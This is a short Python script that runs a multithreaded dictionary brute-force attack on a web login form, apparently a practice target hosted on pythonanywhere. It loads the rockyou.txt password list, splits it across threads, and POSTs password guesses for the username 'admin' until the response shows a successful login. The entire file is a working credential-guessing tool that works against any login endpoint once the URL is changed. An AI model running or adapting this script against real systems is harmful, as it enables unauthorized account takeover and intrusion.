import requests
import threading


url="https://bruteforce.pythonanywhere.com/login"
username="admin"
found=False

def send_request(username,output):
    for i in output:
        data={
            "username":username,
            "password":i
            
        }
        print("[+]Trying Password: ",i)
        r=requests.post(url,data=data)
        if "Logged" in str(r.text):
            print("Password Found: ",i)
            global found
            found=True
        if found:
            break
with open("rockyou.txt","r") as f:
    l=f.read().splitlines()
import math

def split_words(words):
    num_sublists = int(math.ceil(len(words) ** 0.5))
    sublist_size = int(math.ceil(len(words) / num_sublists))
    sublists = [words[i:i+sublist_size] for i in range(0, len(words), sublist_size)]
    return sublists
output=split_words(l)
count=len(output)
threads=[]

for i in range(count):
    t=threading.Thread(target=send_request,args=(username,output[i]))
    t.daemon=True
    threads.append(t)

for i in range(count):
    threads[i].start()

for i in range(count):
    threads[i].join()

